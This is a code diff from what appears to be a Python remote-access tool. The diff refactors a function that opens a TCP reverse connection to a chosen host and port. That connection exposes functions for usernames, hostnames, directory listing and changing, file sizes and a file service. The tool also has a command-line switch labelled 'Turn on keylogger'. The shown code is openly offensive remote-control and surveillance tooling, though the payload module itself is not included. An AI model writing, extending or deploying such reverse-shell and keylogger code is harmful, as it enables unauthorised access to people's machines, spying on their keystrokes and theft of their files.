@@ -3,28 +3,27 @@
 import argparse
 import platform
 
+from . import payload
+
 
 def _linux_connect(args):
     host, port = addr = args.host, args.port
 
-    with TCPReversePayload(addr) as payload:
+    with payload.TCPReversePayload(addr) as p:
         funcs = [
-                get_username,
-                get_hostname,
-                get_platform,
-                list_dir,
-                change_dir,
-                get_current_dir,
-                get_file_size,
-                uname,
+                payload.get_username,
+                payload.get_hostname,
+                payload.get_platform,
+                payload.list_dir,
+                payload.change_dir,
+                payload.get_current_dir,
+                payload.get_file_size,
+                payload.uname,
         ]
         for f in funcs:
-            payload.register_function(f)
-        payload.register_instance(FileService())
-        try:
-            payload.serve_forever()
-        except connection.ConnectionClosed:
-            pass
+            p.register_function(f)
+        p.register_instance(payload.FileService())
+        p.connect_forever()
 
 
 def _linux_listen(args):
@@ -42,10 +41,6 @@ def _linux_main(args):
             prefix_chars='-+',
     )
     payload_group = parser.add_argument_group('payload arguments')
-    payload_group.add_argument('-cd',
-            help='Turn off change directory',
-            action='store_false',
-    )
     payload_group.add_argument('+kl',
             help='Turn on keylogger',
             action='store_true',
